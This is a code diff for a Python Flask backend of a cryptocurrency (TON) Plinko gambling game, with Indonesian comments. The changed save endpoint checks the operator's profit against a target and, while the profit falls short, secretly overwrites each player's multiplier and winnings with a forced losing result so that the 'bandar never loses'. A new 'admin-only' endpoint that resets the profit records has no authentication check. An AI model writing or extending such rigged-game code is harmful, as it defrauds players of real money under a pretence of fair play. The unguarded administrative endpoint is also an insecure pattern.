@@ -22,6 +22,8 @@ print(f"📁 Games DB Path: {GAMES_DB_PATH}")
 os.makedirs(os.path.dirname(PLINKO_DB_PATH), exist_ok=True)
 os.makedirs(os.path.dirname(GAMES_DB_PATH), exist_ok=True)
 
+from games.database.plinko_bandar_v2 import get_multiplier_bandar, save_forced_game_result, get_bandar_status, TARGET_PROFIT
+
 import importlib.util
 spec = importlib.util.spec_from_file_location(
     "plinko_games",
@@ -204,7 +206,7 @@ def get_history():
 
 @plinko_bp.route('/save', methods=['POST', 'OPTIONS'])
 def save_game():
-    """Save game result - MENGGUNAKAN CHEAT SYSTEM"""
+    """Save game result - PAKSA PAKAI SISTEM BANDAR NEVER LOSE"""
     if request.method == 'OPTIONS':
         return _build_cors_preflight_response()
     
@@ -216,30 +218,98 @@ def save_game():
     try:
         print(f"📝 [SAVE GAME] Received data: {data}")
         
-        # PASTIKAN data memiliki semua field yang diperlukan
-        required_fields = ['bet_amount', 'multiplier', 'win_amount', 'round_hash', 'risk_level']
+        # VALIDASI
+        required_fields = ['bet_amount', 'multiplier', 'win_amount', 'round_hash', 'risk_level', 'user_id']
         for field in required_fields:
             if field not in data:
                 print(f"❌ Missing required field: {field}")
                 return jsonify({"success": False, "error": f"Missing required field: {field}"}), 400
         
-        # Simpan pakai cheat system
-        save_result = save_game_result(data)
+        # CEK STATUS BANDAR
+        bandar_status = get_bandar_status()
+        current_profit = bandar_status['current_profit']
+        
+        # KALAU BANDAR RUGI ATAU BELUM UNTUNG, PAKSA PAKAI SISTEM
+        if current_profit < TARGET_PROFIT:
+            # HITUNG ULANG MULTIPLIER PAKSA RUGI
+            forced_multiplier, is_forced, reason = get_multiplier_bandar(
+                data['risk_level'],
+                data['bet_amount'],
+                data['user_id'],
+                data.get('username', 'Unknown')
+            )
+            
+            # OVERRIDE DATA
+            data['multiplier'] = forced_multiplier
+            data['win_amount'] = data['bet_amount'] * forced_multiplier
+            data['cheat_reason'] = reason
+            data['is_forced'] = is_forced
+            
+            print(f"🔴 [BANDAR OVERRIDE] Multiplier changed to {forced_multiplier}x | Reason: {reason}")
+            print(f"   Profit before: {current_profit:.2f} TON | Target: {TARGET_PROFIT} TON")
+        
+        # SIMPAN PAKAI SISTEM BARU
+        save_result = save_forced_game_result(data)
         
         if not save_result:
-            print(f"❌ save_game_result returned False")
+            print(f"❌ save_forced_game_result returned False")
             return jsonify({"success": False, "error": "Failed to save game to database"}), 500
         
-        print(f"✅ Game saved successfully via save_game_result")
+        print(f"✅ Game saved successfully via bandar system")
         
-        # VERIFIKASI: Cek apakah data benar-benar tersimpan
-        history_check = get_cheat_history(1)
-        print(f"📜 Last game in DB after save: {history_check[0] if history_check else 'None'}")
+        # LOG KEUNTUNGAN BARU
+        new_status = get_bandar_status()
+        print(f"💰 [BANDAR AFTER] Profit: {new_status['current_profit']:.2f} TON | Target: {TARGET_PROFIT} TON")
         
         return jsonify({"success": True, "message": "Game saved successfully"})
+        
     except Exception as e:
         print(f"❌ Error saving game: {e}")
         traceback.print_exc()
+        return jsonify({"success": False, "error": str(e)}), 500
+
+
+# TAMBAHKAN ENDPOINT UNTUK RESET BANDAR (HANYA ADMIN)
+@plinko_bp.route('/reset-bandar', methods=['POST', 'OPTIONS'])
+def reset_bandar():
+    """Reset keuntungan bandar"""
+    if request.method == 'OPTIONS':
+        return _build_cors_preflight_response()
+    
+    try:
+        conn = get_plinko_db()
+        cursor = conn.cursor()
+        cursor.execute('''
+            UPDATE bandar_profit 
+            SET total_bet_all_time = 0, total_win_all_time = 0, bandar_profit = 0, 
+                total_cheat_activated = 0, last_updated = CURRENT_TIMESTAMP
+        ''')
+        conn.commit()
+        conn.close()
+        
+        print("🔄 Bandar profit telah direset")
+        return jsonify({"success": True, "message": "Bandar profit reset successfully"})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+
+# TAMBAHKAN ENDPOINT UNTUK CEK STATUS BANDAR
+@plinko_bp.route('/bandar-status', methods=['GET', 'OPTIONS'])
+def bandar_status():
+    """Cek status keuangan bandar"""
+    if request.method == 'OPTIONS':
+        return _build_cors_preflight_response()
+    
+    try:
+        status = get_bandar_status()
+        return jsonify({
+            "success": True,
+            "current_profit": status['current_profit'],
+            "target_profit": TARGET_PROFIT,
+            "deficit": status['deficit'],
+            "needs_force": status['needs_force']
+        })
+    except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
 @plinko_bp.route('/deduct-balance', methods=['POST', 'OPTIONS'])
